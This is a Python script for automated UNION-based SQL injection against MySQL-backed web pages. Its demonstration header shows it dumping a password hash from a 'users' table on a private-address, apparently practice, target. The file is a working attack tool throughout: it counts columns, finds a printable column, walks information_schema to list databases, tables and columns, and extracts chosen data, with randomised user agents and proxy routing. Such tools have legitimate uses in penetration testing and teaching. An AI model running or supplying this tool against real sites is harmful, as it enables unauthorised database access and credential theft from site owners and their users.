# DEMONSTRATION
# $ python3 sqli_mysql_union_error_based.py id get "1" ";-- " http://192.168.252.6/cat.php
# [?] Select a parameter to test for injection:: id
#  > id
# 
# [*] Guessing number of columns for param ID via ORDER BY 
# [*] Number of columns for parameter ID found: 4
# [*] Testing if UNION query returns result via @@version...
#
# [*] Column 2 seems to print results
#
# [?] Choose a method for retrieving or manually entering databases, tables and columns.: Information Schema
#  > Information Schema
#    Enter manually
#
# [?] Select a database:: photoblog
#    information_schema
#  > photoblog
#
# [?] Select a table:: users
#    categories
#    pictures
#  > users
#
# [?] Select a column:: password
#    id
#    login
#  > password
# 
# [1] 8efe310f9ab3efeae8d410a8e0166eb2
# 
# [+] Done!


#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import inquirer
import json
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = "http://localhost:8080"
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Union specific settings
union_qry = " union select "
union_concat = "|"
union_conc_hex = union_concat.encode("utf-8").hex()
union_str = "NULL"

# Default value for empty parameters
def_str = "1234"

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Perform the SQLi call for injection
def sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix):
    inj_params = dict()
    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = prefix + inj_str + suffix

    if get_post.lower() == "get":
        r = requests.get(url, params=inj_params, headers=headers, timeout=timeout, verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url, data=inj_params, headers=headers, timeout=timeout, verify=False)
    return r

# Get an initial response
def initial_req(url,headers,get_post,params):
    norm_params = dict()
    for param in params:
        norm_params[param] = def_str

    if get_post.lower() == "get":
        r = requests.get(url,params=norm_params,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=norm_params,headers=headers,timeout=timeout,verify=False)
    return r

# Get columns
def get_cols(url,headers,get_post,inj_param,params,prefix,suffix):
    guess_columns_method = [" ORDER BY "," GROUP BY "]
    bad_resp = "Unknown column"
    bad_size = 700
    max_columns = 32
    
    initial_r = initial_req(url,headers,get_post,params)
    len_init_r = len(initial_r.content)

    for guess_method in guess_columns_method:
        print("[*] Guessing number of columns for param " + inj_param.upper() + " via" + guess_method)
        for column in range(1,max_columns+1):
            inj_str = guess_method + str(column)
            r = sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix)
            len_inj_r = len(r.content)
            res = r.text
            # if (len_init_r < len_inj_r) or (bad_resp in res):
            # if len_inj_r > bad_size:
            if bad_resp in res:
                return column-1

# Test if UNION is usable for error based return
def blind_test(url,headers,get_post,inj_param,params,columns,prefix,suffix):
    union_qry = " union select "
    union_sel = "@@version"
    union_val = [union_str] * columns
    inj_union = ",".join(list(map(str,union_val)))
    usable_column = 0

    initial_inj = union_qry + inj_union
    initial_r = sqli(url,headers,get_post,inj_param,params,prefix,initial_inj,suffix)

    print("[*] Testing if UNION query returns result via " + union_sel + "...")
    for column in range(0,columns):
        union_val[column] = union_sel
        inj_union = ",".join(list(map(str,union_val)))
        inj_str = union_qry + inj_union
        r = sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix)
        if len(r.content) > len(initial_r.content):
            usable_column = column + 1
            break
        union_val[column] = union_str
    
    if usable_column > 0:
        return usable_column
    else:
        return False

# Get info from information_schema
def get_info_schema(url,headers,get_post,inj_param,params,columns,column,union_obj_name,union_suffix,prefix,suffix):
    union_sel = "group_concat(0x" + union_conc_hex + "," + union_obj_name + ",0x" + union_conc_hex + ")"
    union_val = [union_str] * columns
    union_val[column] = union_sel
    inj_union = ",".join(list(map(str,union_val)))
    
    # Perform injection
    inj_str = union_qry + inj_union + union_suffix
    r = sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix)

    # Search for regex by using union_concat character
    re_string = re.escape(union_concat) + r".*" + re.escape(union_concat)
    result = re.findall(re_string,r.text)

    # Split the response
    for res in result:
        res = res.replace(union_concat,'')
        res_info_schema = res.split(",")
    
    # Return result
    if result:
        return res_info_schema
    else:
        return False

# Get data
def get_data(url,headers,get_post,inj_param,params,columns,column,union_obj_name,union_suffix,prefix,suffix):
    union_sel = "group_concat(0x" + union_conc_hex + "," + union_obj_name + ",0x" + union_conc_hex + ")"
    union_val = [union_str] * columns
    union_val[column] = union_sel
    inj_union = ",".join(list(map(str,union_val))) + union_suffix
    
    # Perform injection
    inj_str = union_qry + inj_union
    r = sqli(url,headers,get_post,inj_param,params,prefix,inj_str,suffix)

    # Search for regex by using union_concat character
    re_string = re.escape(union_concat) + r".*" + re.escape(union_concat)
    result = re.findall(re_string,r.text)

    # Split the response
    for res in result:
        res = res.replace(union_concat,'')
        res_info_schema = res.split(",")
    
    # Return result
    if result:
        return res_info_schema
    else:
        return False

# Main
def main(argv):
    if len(sys.argv) == 6:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        prefix = sys.argv[3]
        suffix = sys.argv[4]
        url = sys.argv[5]
    else:
        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <prefix> <suffix> <url>")
        print("[*] Example: " + sys.argv[0] + " id get \"1\" \";-- \" http://192.168.252.6/cat.php\n")
        exit(0)

    # Random headers
    headers = http_headers()

    # Do stuff
    try:
        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Getting number of columns
        num_cols = get_cols(url,headers,get_post,inj_param,params,prefix,suffix)
        if num_cols:
            print("[*] Number of columns for parameter " + inj_param.upper() + " found: " + str(num_cols))
        else:
            print("[!] No columns found, check your requests")
            exit(-1)

        # Test if a certain column is usable
        usable_column = blind_test(url,headers,get_post,inj_param,params,num_cols,prefix,suffix)
        if usable_column:
            print("\n[*] Column " + str(usable_column) + " seems to print results\n")
        else:
            print("[!] No usable column found, exiting...")
            exit(-1)

        # Ask for getting via information_schema or manual input
        options = ["Information Schema","Enter manually"]
        info_schema_manual_question = [inquirer.List('options',
                                    message="Choose a method for retrieving or manually entering databases, tables and columns.",
                                    choices=options),]
        info_schema_manual_answer = inquirer.prompt(info_schema_manual_question)
        info_method = info_schema_manual_answer["options"]
            
        if info_method == "Information Schema":
            # Get databases
            union_suffix = " from information_schema.schemata"
            union_obj_name = "schema_name"
            dbs = get_info_schema(url,headers,get_post,inj_param,params,num_cols,usable_column-1,union_obj_name,union_suffix,prefix,suffix)
            if dbs:
                db_question = [inquirer.List('databases',
                            message="Select a database:",
                            choices=dbs),]
                db_answer = inquirer.prompt(db_question)
            else:
                print("[!] Unable to find any database, probably no access to information_schema.")
                exit(-1)

            # Get tables
            union_suffix = " from information_schema.tables where table_schema='" + db_answer["databases"] + "'"
            union_obj_name = "table_name"
            tables = get_info_schema(url,headers,get_post,inj_param,params,num_cols,usable_column-1,union_obj_name,union_suffix,prefix,suffix)
            if tables:
                table_question = [inquirer.List('tables',
                            message="Select a table:",
                            choices=tables),]
                table_answer = inquirer.prompt(table_question)
            else:
                print("[!] Unable to find any tables, exiting...")
                exit(-1)

            # Get columns
            union_suffix = " from information_schema.columns where table_name='" + table_answer["tables"] + "'"
            union_obj_name = "column_name"
            columns = get_info_schema(url,headers,get_post,inj_param,params,num_cols,usable_column-1,union_obj_name,union_suffix,prefix,suffix)
            if columns:
                column_question = [inquirer.List('columns',
                            message="Select a column:",
                            choices=columns),]
                column_answer = inquirer.prompt(column_question)
            else:
                print("[!] Unable to find any colomns, exiting...")
                exit(-1)
    
            # Set answers in variables to retrieve data   
            dbs = db_answer["databases"]
            tables = table_answer["tables"]
            cols = column_answer["columns"]
        elif info_method == "Enter manually":
            # Data entered manually
            dbs = input("Enter a database: ")
            tables = input("Enter a table: ")
            cols = input("Enter a column: ")
            print("\n")

        # Get data
        union_suffix = " from " + tables
        data = get_data(url,headers,get_post,inj_param,params,num_cols,usable_column-1,cols,union_suffix,prefix,suffix)
        if data:
            row = 0
            for res in data:
                row +=1
                print("[" + str(row) + "] " + res)
        else:
            print("[!] Unable to find any data, exiting...")
            exit(-1)

        # Done
        print("\n[+] Done!\n")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
